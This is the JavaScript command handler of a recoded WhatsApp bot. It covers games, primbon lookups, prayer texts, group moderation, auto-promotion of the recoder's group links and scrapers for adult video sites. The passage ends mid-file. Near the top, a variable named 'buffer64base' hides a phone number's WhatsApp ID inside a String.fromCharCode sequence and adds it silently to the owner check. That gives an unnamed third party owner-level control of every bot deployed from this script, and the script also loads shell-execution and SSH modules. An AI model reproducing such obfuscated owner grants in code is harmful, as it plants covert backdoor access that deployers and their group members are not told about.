/* 

=========================================================================

// Saya(Andikarecode) Pertama Kali
// Menemukan Script Ini Dari Youtube
// Nama Channel Nya <Daffa> Kayaknya.
// Lalu Saya Recode.
// Tapi Kelihatan Nya Script Ini Punya <Skyzo>
// =========================================
// https://whatsapp.com/channel/0029Vav7vtlI7BeEQ5z7qH3c
// {( IKUTI SALURAN SAYA )}
// ==========================================
// ~AndikaRecode
=========================================================================

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { jarak, pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, toRupiah } = require('./library/function');


module.exports = Sky = async (Sky, m, chatUpdate, store) => {
	try {
await LoadDataBase(Sky, m)
const botNumber = await Sky.decodeJid(Sky.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.replace(prefix,'') ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.replace(prefix,'').trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
let teksbenar = [
  "Kok lu pinter sih?",
  "Jirr gg",
  "Mantap",
  "Anjay bener",
  "Kok lu tau",
  "Anjrit pinter",
  "Anjrit pinter banget lu",
  "Anjass kelazz",
  "Jirr.. Lu kelas berapa dah",
  "Gg sihhh",
  "Anjay bener rawwrr",
  "Jir kok pinter? murid andika ya?",
  "Gilaa sihhh bisa jawab",
  "Jirrr... Cuma lu yg bisa jawab",
  "Lu anak mana sih pinter amat",
  "Pinter, Anak guru pasti?",
  "Belajar berapa kali sehari. pinter lu"
];
const jawabBener = teksbenar[Math.floor(Math.random() * teksbenar.length)];


//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
if (!m.isAdmin && !isCreator && !m.fromMe) {
if (body.match("whatsapp.com")){
if (!m.isBotAdmin) return
let delet = m.key.participant
let bang = m.key.id
await Sky.sendMessage(m.chat, {text: `*[ Group Link Detected ]*
@${m.sender.split("@")[0]} Sorry I kicked, your message contained a group link!`, mentions: [m.sender]}, {quoted: m})
await Sky.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Sky.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
if (!m.isAdmin && !isCreator && !m.fromMe) {
if (body.match("whatsapp.com")){
if (!m.isBotAdmin) return
let delet = m.key.participant
let bang = m.key.id
await Sky.sendMessage(m.chat, {text: `*[ Group Link Detected ]*
@${m.sender.split("@")[0]} Sorry I deleted it, your message contained a group link!`, mentions: [m.sender]}, {quoted: m})
await Sky.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Sky.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}}

if (m.isGroup && db.settings.autopromosi == true) {
if (body.includes("wa.me") && !m.fromMe && global.db.groups[m.chat].blacklistjpm == false) {
await Sky.sendMessage(m.chat, {text: `${`
*🏘 GC OFFICIAL BUSSID*
https://chat.whatsapp.com/FpnCzfwCu9eA60P0DxxygQ

*🏘 GC1 ANDK STORE*
https://chat.whatsapp.com/BjbTinXEvHCGmbW2PFAegI

*🏘 GC2 ANDK STORE*
https://chat.whatsapp.com/DsTvBAdSsDxJcUXlIuoK5s

*🏢 CH1 TESTI*
https://whatsapp.com/channel/0029Vav88A64IBhJxscm8I1m

*🏢 CH2 ALL INFO*
https://whatsapp.com/channel/0029Vav7vtlI7BeEQ5z7qH3c

*📖Yang Masuk Semua Grub Maupun Salah Satu Grub Semoga Dilimpahkan Rezeki Nya Ya Allah Dan Panjang Umur Nya Amiin🤲*
`.toString()}`}, {quoted: null})
}
}

if (m.isGroup) {
if (budy.includes(`Asalamualaikum`)) {
await sleep(1000)
await m.reply("Waalaikumussalam kkak")
} if (budy.includes(`asalamualaikum`)) {
await sleep(1000)
await m.reply("Waalaikumussalam kkak")
} if (budy.includes(`Samlekom`)) {
await sleep(1000)
await m.reply("Waalaikumussalam kkak")
} if (budy.includes(`samlekom`)) {
await sleep(1000)
await m.reply("Waalaikumussalam kkak")
} if (budy.includes(`assalamu`)) {
await m.reply("Waalaikumussalam kkak")
} if (budy.includes(`Assalamu`)) {
await m.reply("Waalaikumussalam kkak")
}
}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

async function searchVideo(query) {
  const url = `https://www.pornhub.com/video/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const videoList = [];

  $('li[data-video-segment]').each((index, element) => {
    const $element = $(element);
    
    const link = $element.find('.title a').attr('href').trim();
    const title = $element.find('.title a').text().trim();
    const uploader = $element.find('.videoUploaderBlock a').text().trim();
    const views = $element.find('.views').text().trim();
    const duration = $element.find('.duration').text().trim();
    
    const videoData = {
      link: "https://www.pornhub.com" + link,
      title: title,
      uploader: uploader,
      views: views,
      duration: duration
    };
    
    videoList.push(videoData);
  });
  
  return videoList;
}

async function hentaivid() {
return new Promise((resolve, reject) => {
const page = Math.floor(Math.random() * 1153)
axios.get('https://sfmcompile.club/page/'+page)
.then((data) => {
const $ = cheerio.load(data.data)
const hasil2 = []
$('#primary > div > div > ul > li > article').each(function (a, b) {
hasil2.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
})
resolve(hasil2)
})
})
}

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return Sky.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}

const Akses = async (teks) => {
return Sky.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `❌` }, 
externalAdReply: {
title: 'Access denied', 
body: `Error in granting access`, 
thumbnailUrl: global.image.akses, 
sourceUrl: null, 
}}}, {quoted: null})
}

const Replymenu = async (teks0) => {
let sections = [
        {
		title: `WhatsApp Bot By ${namaOwner}`, 
		rows: [
  {
  title: '「 ⛧⁩ 」 Sewa',
  description: `  -- Display Price List Rental`, 
  id: `${prefix}sewa`
  },  
  {
  title: '「 ⛧⁩ 」 Donasi',
  description: "  -- Display Qris Donate",
  id: `${prefix}donasi`
  },
  {
  title: '「 ⛧⁩ 」 Script',
  description: '  -- Link Script My Bot',
  id: `${prefix}scriptkats`
  },
  ]},
        {
        title: `List Menu WhatsApp Bot`, 
        highlight_label: `The Best`,
        rows: [
  {
  title: '「 = 」All Menu',
  description: "  -- Display All menu Bot",
  id: `${prefix}allkats`
  },
  {
  title: "「 = 」Search Menu",
  description: "  -- Display Search Menu",
  id: `${prefix}searchkats`
  },
  {
  title: "「 = 」Group Menu",
  description: "  -- Display Group Menu",
  id: `${prefix}groupkats`
  },
  {
  title: "「 = 」Tools Menu",
  description: "  -- Display Tools Menu",
  id: `${prefix}toolskats`
  },
  {
  title: "「 = 」Fun Menu",
  description: "  -- Display Fun Menu",
  id: `${prefix}funkats`
  },
  {
  title: "「 = 」Download Menu",
  description: "  -- Display Download Menu",
  id: `${prefix}downloadkats`
  },
  {
  title: "「 = 」Panel Menu",
  description: "  -- Display Panel Menu",
  id: `${prefix}panelkats`
  },
  {
  title: "「 = 」Game Menu",
  description: "  -- Display Game Menu",
  id: `${prefix}gamekats`
  },
  {
  title: "「 = 」Islam Menu",
  description: "  -- Display Islamic Menu",
  id: `${prefix}islamkats`
  },
  {
  title: '「 = 」18+ Menu',
  description: "  -- Display 18+ Menu",
  id: `${prefix}18kats`
  },
  {
  title: "「 = 」Owner Menu",
  description: "  -- Display Menu Owner My Love",
  id: `${prefix}ownerkats`
  },
  {
  title: "「 = 」Other Menu",
  description: "  -- Others Menu",
  id: `${prefix}otherkats`
  },
  {
  title: '「 = 」Ocean & Installer Menu',
  description: "  -- Display Next Menu",
  id: `${prefix}nextmenu`
  }
]}]

let listMessage = {
    title: 'List Menu! 📑',
    sections };

let msghhhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
    message: {
    "messageContextInfo": {
    "deviceListMetadata": {},
    "deviceListMetadataVersion": 2 },
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
    mentionedJid: [m?.sender,global.owner+"@s.whatsapp.net"],
    isForwarded: true,
  forwardedNewsletterMessageInfo: {
    newsletterJid: idSaluran,
    newsletterName: namaSaluran,
    serverMessageId: -1 },
  businessMessageForwardInfo: {
    businessOwnerJid: Sky.decodeJid(Sky.user.id) },
  externalAdReply: {
    title: `Its Me ${botname2}`,
    body: `My Owner : ${namaOwner}`,
    thumbnailUrl: global.image.thumb,
    sourceUrl: global.linkSaluran,
    mediaType: 1,
    renderLargerThumbnail: true }
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks0 }),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© ${namaOwner}` }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 thumbnailUrl: "",
 gifPlayback: true,
 subtitle: "Multi Device",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({
 document: fs.readFileSync('./ANDKRECODE'),
 mimetype: "application/msword",
 jpegThumbnail: fs.readFileSync('./ANDKRECODE'),
 fileName: "Simple Whatsapp Bot",
 }, {
 upload: Sky.waUploadToServer
 }))
 }),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
  {
  "name": "single_select",
  "buttonParamsJson": JSON.stringify(listMessage)
  },
  {
  "name": "cta_url",
  "buttonParamsJson": `{\"display_text\":\"WhatsApp Channel 📢\",\"url\":\"${linkSaluran}\",\"merchant_url\":\"https://www.google.com\"}`
  }
]
})
})
}
}
}, {
quoted: null
});
await Sky.relayMessage(msghhhhhhhhhhhhhhhhhhh.key.remoteJid, msghhhhhhhhhhhhhhhhhhh.message, {
    messageId: msghhhhhhhhhhhhhhhhhhh.key.id
});
}

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}

const from = m.key.remoteJid
let tebakkata = []
Sky.tebakkata = Sky.tebakkata ? Sky.tebakkata : {}  
if (from in Sky.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Sky.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
var teks = `*🀄 Game Tebak Kata*

- Jawaban Benar
- 🕊 ${jawabBener}`
let msg = generateWAMessageFromContent(m.chat, {
	viewOnceMessage: {
	message: {
	"messageContextInfo": {
	"deviceListMetadata": {},
	"deviceListMetadataVersion": 2
	},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
  text: `Ingin Bermain Lagi?` }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{ 
"name": "quick_reply", "buttonParamsJson": `{\"display_text\":\"Play Again\",\"id\":\"${prefix}tebakkatakats\"}`
}
],
}),
})
}}}, { quoted: m })
await Sky.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
});
clearTimeout(Sky.tebakkata[id][2])
delete Sky.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}

let tebaksusunkata = []
Sky.susunkata = Sky.susunkata ? Sky.susunkata : {}  
if(from in Sky.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(Sky.susunkata[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   var teks = `*🀄 Game Susun Kata*
   
- Jawaban Kamu Benar!
- 🕊 ${jawabBener}`
let msg = generateWAMessageFromContent(m.chat, {
	viewOnceMessage: {
	message: {
	"messageContextInfo": {
	"deviceListMetadata": {},
	"deviceListMetadataVersion": 2
	},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
  text: `Ingin Bermain Lagi?` }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{ 
"name": "quick_reply", "buttonParamsJson": `{\"display_text\":\"Play Again\",\"id\":\"${prefix}susunkatakats\"}`
}
],
}),
})
}}}, { quoted: m })
Sky.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
 clearTimeout(Sky.susunkata[id][3])
 delete Sky.susunkata[id]
 } else console.log(`*Jawaban Salah*`)
// else reply(`*Salah!*`)
}
//========= [ OTHER ] =================================================

let speed = require('performance-now');
let timestamp = speed();
let more = String.fromCharCode(8206);
global.readmore = more.repeat(4001);
const latensi = speed() - timestamp;
global.botinfo = `🖥 *\`BOT - INFORMATION\`*
  » Version : *${global.versi}*
  » Mode : *${Sky.public ? "Public": "Self"}*
  » Creator : @${global.owner}
  » Runtime Bot : *${runtime(process.uptime())}*
  » Uptime Vps : *${runtime(os.uptime())}*
  » Respon Speed : *${latensi.toFixed(4)}*`
global.userinfo = `👤 *\`USER - INFORMATION\`*
  • Number : ${m.sender.split("@")[0]}
  • Status : *${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}*`

async function loading () {
let mili = [
  "2800",
  "3500",
  "4000",
  "4123",
  "5000"
];
const lama = mili[Math.floor(Math.random() * mili.length)];
var kayy = `⏱`
await Sky.sendMessage(m.chat, {react: {text: kayy, key: m.key}})
await sleep(lama)
await Sky.sendMessage(m.chat, {react: {text: ``, key: m.key}})
}

//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const skyzodev = { Sky, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, Akses, botNumber }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return

//===============================================================================
//============= [ COMMANDS ] ====================================================
//===============================================================================
switch (command) {








case "jarak":{
var [fromo, to] = text.split`-`
if (!(fromo && to)) return m.reply(example(`jakarta-wonogiri`))
var data = await jarak(fromo, to)
if (data.img) return Sky.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted: qlocJpm })
else m?.reply(data.desc)
}
break

case 'susunkata': case 'susunkatakats': {
  if (!m.isGroup) return Akses(mess.group)
	let timeout = 60000
	let id = m.chat
	if (id in Sky.susunkata) return m.reply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `*🀄 Game Tebak Kata*

- *Soal: ${json.soal}*
- Tipe: ${json.tipe}
- Waktu: 60s`
	Sky.susunkata[id] = [
	await Reply(`${caption}`),
	json,
	setTimeout(() => {
if (Sky.susunkata[id]) 
console.log("Jawaban: " + json.jawaban)
tekss = `*💢 Game Susun Kata*

- Waktu Habis!
- Jawabannya Adalah: *${json.jawaban}*`
let msg = generateWAMessageFromContent(m.chat, {
	viewOnceMessage: {
	message: {
	"messageContextInfo": {
	"deviceListMetadata": {},
	"deviceListMetadataVersion": 2
	},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: tekss
}),
footer: proto.Message.InteractiveMessage.Footer.create({
  text: `Ingin Bermain Lagi?` }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{ 
"name": "quick_reply", "buttonParamsJson": `{\"display_text\":\"Play Again\",\"id\":\"${prefix}susunkatakats\"}`
}
],
}),
})
}}}, { quoted: qlocJpm })
Sky.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
	delete Sky.susunkata[id]
	 }, timeout)
	 ]
	}
	break

//===============================================================================

case 'tebakkata': case 'tebakkatakats': {
if (!m.isGroup) return Akses(mess.group)
let timeout = 60000
let id = m.chat
if (id in Sky.tebakkata) return m.reply("Masih Ada Sesi Yang Belum Diselesaikan!")
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `*🀄 Game Tebak Kata*

- Silahkan Jawab Tebak Kata Berikut
- *Clue : ${json.soal}*
- Waktu : 60s`
Sky.tebakkata[id] = [
await Reply(`${caption}`),
json,
setTimeout(() => {
if (Sky.tebakkata[id]) 
console.log("Jawaban: " + json.jawaban)
let habis = `*💢 Game Tebak Kata*

- Waktu Habis!
- Jawabannya Adalah: *${json.jawaban}*`
let msg = generateWAMessageFromContent(m.chat, {
	viewOnceMessage: {
	message: {
	"messageContextInfo": {
	"deviceListMetadata": {},
	"deviceListMetadataVersion": 2
	},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: habis
}),
footer: proto.Message.InteractiveMessage.Footer.create({
  text: `Ingin Bermain Lagi?` }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{ 
"name": "quick_reply", "buttonParamsJson": `{\"display_text\":\"Play Again\",\"id\":\"${prefix}tebakkatakats\"}`
}
],
}),
})
}}}, { quoted: qlocJpm })
Sky.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
delete Sky.tebakkata[id]
}, 60000)
]
}
break

//===============================================================================

case 'weton': case 'wetonjawa': {
if (!text) return m.reply(example(`7, 7, 2005`))
await loading ()
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Reply(`⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break

//===============================================================================

case 'haribaik': {
if (!text) return m.reply(example(`7, 7, 2005`))
await loading ()
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
Reply(`⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break

//===============================================================================

case 'artinama': {
if (!text) return m.reply(example(`Andika Ganteng`))
await loading ()
let anu = await primbon.arti_nama(text)
if (anu.status == false) return m.reply(anu.message)
Reply(`👤 *Nama :* ${anu.message.nama}\n📖 *Arti :* ${anu.message.arti}`)
}
break

//===============================================================================

case 'niatsholat': {
let teks = `*Niat Sholat Apa Yang Kamu Cari? Berikut Niat Sholat Yang Tersedia :*
- Subuh
- Dzuhur
- Ashar
- Maghrib
- Isha`
let msg = generateWAMessageFromContent(m.chat, {
	viewOnceMessage: {
	message: {
	"messageContextInfo": {
	"deviceListMetadata": {},
	"deviceListMetadataVersion": 2
	},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
  footer: proto.Message.InteractiveMessage.Footer.create({
  text: `© ${namaOwner}` }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
  {
	"name": "single_select",
	"buttonParamsJson": `{
	"title": "Select Niat",
	"sections": [
	{
	"title": "Bot WhatsApp By ${namaOwner}",
    "highlight_label": "The Best",
	"rows": [
	{
	"title": "✨ Donasi",
	"description": "<!> Select For Donate",
	"id": ".donasi"
	}
	]},
	    {
        "title": "Select the menu you need at ${botname}", 
        "rows": [
	{
    "title": "Niat Sholat Subuh",
    "description": "<!> Select to view",
    "id": "${prefix}niatsholatkats subuh"
    },
    {
	"title": "Niat Sholat Dzuhur",
	"description": "<!> Select to view",
	"id": "${prefix}niatsholatkats dzuhur"
	},
	{
	"title": "Niat Sholat Ashar",
	"description": "<!> Select to view",
	"id": "${prefix}niatsholatkats ashar"
	},
	{
	"title": "Niat Sholat Maghrib",
	"description": "<!> Select to view",
	"id": "${prefix}niatsholatkats maghrib"
	},
    {
	"title": "Niat Sholat Isha",
	"description": "<!> Select to view",
	"id": "${prefix}niatsholatkats isha"
    }
]
}]
}`
},
],
}),
contextInfo: {
mentionedJid: [m.sender,global.owner+"@s.whatsapp.net"],
forwardingScore: 1,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
serverMessageId: null,
newsletterName: global.namaSaluran,
},
}
})
}
}
}, { quoted: qlocJpm })
await Sky.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}
break

case 'niatsholatkats': {
    if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhol dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
